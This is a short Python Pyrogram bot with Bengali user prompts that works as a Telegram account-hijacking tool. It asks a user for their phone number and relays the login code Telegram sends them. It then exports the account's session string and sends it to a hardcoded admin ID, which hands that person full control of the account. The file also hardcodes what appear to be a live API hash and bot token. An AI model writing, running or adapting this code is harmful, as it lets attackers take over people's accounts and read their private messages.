import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import SessionPasswordNeeded

# 🔐 Config (Hardcoded)
API_ID = 23347107
API_HASH = "8193110bf32a08f41ac6e9050b2a4df4"
BOT_TOKEN = "7620884098:AAF8ObWhRQxsB0IXuFa_0bTWh5QQeE9dKmo"
ADMIN_ID = 7051377916  # Your Telegram numeric ID

bot = Client("bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
sessions = {}

@bot.on_message(filters.private & filters.command("start"))
async def start(client, message):
    await message.reply("📲 আপনার ফোন নম্বর দিন:\nউদাহরণ: `+8801XXXXXXXXX`", quote=True)

@bot.on_message(filters.private & filters.text & ~filters.command("start"))
async def get_phone(client, message):
    user_id = message.from_user.id
    phone = message.text.strip()

    if not phone.startswith("+") or not phone[1:].isdigit():
        await message.reply("❌ সঠিক নম্বর দিন, যেমন: +8801XXXXXXXXX")
        return

    if user_id in sessions:
        await message.reply("⚠️ আপনি আগেই নম্বর দিয়েছেন।")
        return

    await message.reply("📨 কোড পাঠানো হচ্ছে...")

    session = Client(f"sessions/{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    await session.connect()

    try:
        sent_code = await session.send_code(phone)
        sessions[user_id] = {
            "client": session,
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash
        }
        await message.reply("✅ এখন Telegram এ আসা কোডটি পাঠান (যেমন: 12345)")
    except Exception as e:
        await message.reply(f"❌ সমস্যা: {e}")
        await session.disconnect()

@bot.on_message(filters.private & filters.text)
async def get_code(client, message):
    user_id = message.from_user.id
    if user_id not in sessions:
        return

    code = message.text.strip()
    session_data = sessions[user_id]
    session = session_data["client"]

    try:
        await session.sign_in(
            phone_number=session_data["phone"],
            phone_code_hash=session_data["phone_code_hash"],
            phone_code=code
        )
        string_session = await session.export_session_string()
        await bot.send_message(ADMIN_ID, f"✅ Session Created:\n\n`{string_session}`")
        await message.reply("🎉 Session তৈরি হয়ে গেছে ও Admin-এর কাছে পাঠানো হয়েছে।")
    except SessionPasswordNeeded:
        await message.reply("🔐 2FA password প্রয়োজন।")
    except Exception as e:
        await message.reply(f"❌ Error: {e}")
    finally:
        await session.disconnect()
        del sessions[user_id]

bot.run()
